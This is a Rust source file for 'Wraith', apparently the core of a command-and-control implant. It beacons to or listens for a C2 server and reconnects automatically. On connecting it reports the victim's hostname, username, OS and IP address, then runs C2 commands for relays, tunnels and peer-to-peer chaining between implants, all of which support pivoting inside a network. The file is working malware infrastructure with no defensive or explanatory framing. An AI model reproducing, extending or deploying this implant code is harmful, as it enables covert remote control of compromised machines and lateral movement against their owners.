use crate::commands::agent::AgentCommands;
use crate::commands::command::Command;
use crate::commands::relay::RelayCommands;
use crate::connection::Connection;
use crate::connection::tcp::TcpConnection;
use crate::message::codec::MessageCodec;
use crate::proto::wraith::{MessageType, WraithMessage};
use crate::relay::RelayManager;
use crate::wraith::dispatcher::MessageDispatcher;
use crate::wraith::state::WraithState;
use crate::wraith::tunnel::TunnelManager;
use log::{error, info};
use std::sync::{Arc, Mutex};
use std::fmt;

#[derive(Debug)]
pub enum WraithError {
    NoConnection,
    Message(String),
}

impl fmt::Display for WraithError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            WraithError::NoConnection => {
                write!(f, "No C2 connection set for wraith!")
            }
            WraithError::Message(msg) => {
                write!(f, "{msg}")
            }
        }
    }
}

impl std::error::Error for WraithError {}

pub struct Wraith {
    connection: Option<TcpConnection>,
    state: Arc<Mutex<WraithState>>,
    dispatcher: MessageDispatcher,
    tunnel_manager: Arc<TunnelManager>,
    agent_mode: bool,
    peer_listen_addr: Option<String>,
    peer_connect_addr: Option<String>,
}

impl Wraith {
    pub fn new(wraith_id: &String) -> Self {
        let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
        let tunnel_manager = Arc::new(TunnelManager::new());
        let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(wraith_id.clone(), relay_manager.clone())));
        let relay_commands = RelayCommands::new(relay_manager.clone(), tunnel_manager.clone());
        let agent_commands = AgentCommands::new(tunnel_manager.clone());

        Self {
            connection: None,
            state,
            dispatcher: MessageDispatcher::new(relay_commands, agent_commands),
            tunnel_manager,
            agent_mode: false,
            peer_listen_addr: None,
            peer_connect_addr: None,
        }
    }

    pub fn create_connection(&mut self, host: String, port: u16, is_server: bool) {
        self.connection = Some(TcpConnection::new(host, port, is_server));
    }

    pub fn is_connected(&self) -> bool {
        self.connection.as_ref().map(|c| c.is_connected()).unwrap_or(false)
    }

    pub fn state(&self) -> Arc<Mutex<WraithState>> {
        Arc::clone(&self.state)
    }

    pub fn tunnel_manager(&self) -> Arc<TunnelManager> {
        Arc::clone(&self.tunnel_manager)
    }

    /// Main run loop - handles C2 connection (server or client based on connection type)
    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let connection = match &mut self.connection {
            Some(c) => c,
            None => {
                error!("No C2 connection set for wraith!");
                return Err(Box::from(WraithError::NoConnection));
            }
        };

        if connection.is_server() {
            connection.listen().await?;
        } else {
            connection.connect().await?;
        }

        self.state.lock().unwrap().set_connected(true);
        self.register().await?;

        let connection = self.connection.as_mut().ok_or(WraithError::NoConnection)?;
        loop {
            match connection.read_message().await {
                Ok(msg) => {
                    let msg_type = msg.msg_type;
                    match msg_type {
                        x if x == MessageType::Command as i32 => {
                            if let Some(response) = self.dispatcher.dispatch(msg, Arc::clone(&self.state)).await {
                                connection.send_message(&response).await?;
                            }
                        }
                        _ => {
                            info!("Received message type: {}", msg_type);
                        }
                    }
                }
                Err(e) => {
                    error!("Read failed: {}", e);
                    break;
                }
            }
        }

        self.state.lock().unwrap().set_connected(false);
        Ok(())
    }

    /// Agent listener mode: C2 listens for connections, peer listener runs concurrently
    /// This method blocks - spawn it as a task if you need to do other things
    pub async fn run_c2_listener(&self, c2_addr: String) {
        let state = Arc::clone(&self.state);
        let relay_commands = self.dispatcher.relay_commands();
        let agent_commands = self.dispatcher.agent_commands();

        loop {
            info!("C2 listener waiting for connection on {}", c2_addr);

            match tokio::net::TcpListener::bind(&c2_addr).await {
                Ok(listener) => {
                    match listener.accept().await {
                        Ok((stream, peer_addr)) => {
                            info!("C2 connected from: {}", peer_addr);
                            let state = Arc::clone(&state);
                            let relay_commands = Arc::clone(&relay_commands);
                            let agent_commands = Arc::clone(&agent_commands);

                            tokio::spawn(async move {
                                if let Err(e) = Self::handle_c2_connection(stream, state, relay_commands, agent_commands).await {
                                    error!("C2 handler error: {}", e);
                                }
                            });
                        }
                        Err(e) => {
                            error!("Failed to accept C2 connection: {}", e);
                        }
                    }
                }
                Err(e) => {
                    error!("Failed to bind C2 listener on {}: {}", c2_addr, e);
                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                }
            }
        }
    }

    /// Handle a single C2 connection
    async fn handle_c2_connection(
        stream: tokio::net::TcpStream,
        state: Arc<Mutex<WraithState>>,
        relay_commands: Arc<Mutex<RelayCommands>>,
        agent_commands: Arc<Mutex<AgentCommands>>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let mut connection = TcpConnection::from_stream(stream);

        // Get registration data before locking
        let (hostname, username, os, ip_address) = {
            let mut s = state.lock().unwrap();
            s.set_connected(true);
            (s.hostname.clone(), s.username.clone(), s.os.clone(), s.ip_address.clone())
        };

        // Send registration
        let msg = MessageCodec::create_registration(hostname, username, os, ip_address);
        connection.send_message(&msg).await?;
        info!("Registration sent to C2");

        loop {
            match connection.read_message().await {
                Ok(msg) => {
                    let msg_type = msg.msg_type;
                    match msg_type {
                        x if x == MessageType::Command as i32 => {
                            if let Some(response) = Self::dispatch_command(msg, Arc::clone(&state), Arc::clone(&relay_commands), Arc::clone(&agent_commands)).await {
                                connection.send_message(&response).await?;
                            }
                        }
                        _ => {
                            info!("Received message type: {}", msg_type);
                        }
                    }
                }
                Err(e) => {
                    error!("Read failed: {}", e);
                    break;
                }
            }
        }

        state.lock().unwrap().set_connected(false);
        Ok(())
    }

    /// Dispatch a command message
    async fn dispatch_command(
        msg: WraithMessage,
        state: Arc<Mutex<WraithState>>,
        relay_commands: Arc<Mutex<RelayCommands>>,
        agent_commands: Arc<Mutex<AgentCommands>>,
    ) -> Option<WraithMessage> {
        if let Some(crate::proto::wraith::wraith_message::Payload::Command(cmd)) = &msg.payload {
            let result = if cmd.action == "create_relay" {
                let relay_cmds = relay_commands.lock().unwrap();
                let local_wraith_id = state.lock().unwrap().wraith_id.clone();
                relay_cmds.handle_create_relay(cmd, &local_wraith_id)
            } else if cmd.action == "delete_relay" || cmd.action == "list_relays" {
                relay_commands.lock().unwrap().execute(cmd)
            } else if cmd.action == "set_id" {
                agent_commands.lock().unwrap().handle_set_id(cmd, &mut state.lock().unwrap())
            } else if cmd.action == "list_peers" {
                agent_commands.lock().unwrap().handle_list_peers(cmd, &state.lock().unwrap())
            } else if cmd.action == "wraith_listen" {
                agent_commands.lock().unwrap().handle_wraith_listen(cmd)
            } else if cmd.action == "wraith_connect" {
                agent_commands.lock().unwrap().handle_wraith_connect(cmd, &state.lock().unwrap())
            } else {
                return None;
            };

            state.lock().unwrap().increment_commands();

            return Some(MessageCodec::create_command_result(
                result.command_id,
                result.status,
                result.output,
                result.exit_code,
                result.duration_ms,
                result.error,
            ));
        }
        None
    }

    /// Agent connect mode: connect to C2 with automatic reconnection
    /// Also spawns peer connection which should be handled separately
    pub async fn run_c2_client(&self, host: String, port: u16) {
        let state = Arc::clone(&self.state);
        let relay_commands = self.dispatcher.relay_commands();
        let agent_commands = self.dispatcher.agent_commands();

        loop {
            let addr = format!("{}:{}", host, port);
            info!("C2 client connecting to {}", addr);

            match tokio::net::TcpStream::connect(&addr).await {
                Ok(stream) => {
                    info!("C2 client connected to {}", addr);
                    match Self::handle_c2_connection(stream, Arc::clone(&state), Arc::clone(&relay_commands), Arc::clone(&agent_commands)).await {
                        Ok(_) => info!("C2 connection closed gracefully"),
                        Err(e) => error!("C2 connection error: {}", e),
                    }
                }
                Err(e) => {
                    error!("Failed to connect to C2 at {}: {}", addr, e);
                }
            }

            info!("C2 client reconnecting in 5 seconds...");
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
        }
    }

    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let state = self.state.lock().unwrap();
        let msg = MessageCodec::create_registration(
            state.hostname.clone(),
            state.username.clone(),
            state.os.clone(),
            state.ip_address.clone(),
        );
        drop(state);

        if let Some(conn) = &mut self.connection {
            conn.send_message(&msg).await?;
            info!("Registration sent");
        }
        Ok(())
    }
}

impl Clone for Wraith {
    fn clone(&self) -> Self {
        Self {
            connection: None,
            state: Arc::clone(&self.state),
            dispatcher: self.dispatcher.clone(),
            tunnel_manager: Arc::clone(&self.tunnel_manager),
            agent_mode: self.agent_mode,
            peer_listen_addr: self.peer_listen_addr.clone(),
            peer_connect_addr: self.peer_connect_addr.clone(),
        }
    }
}
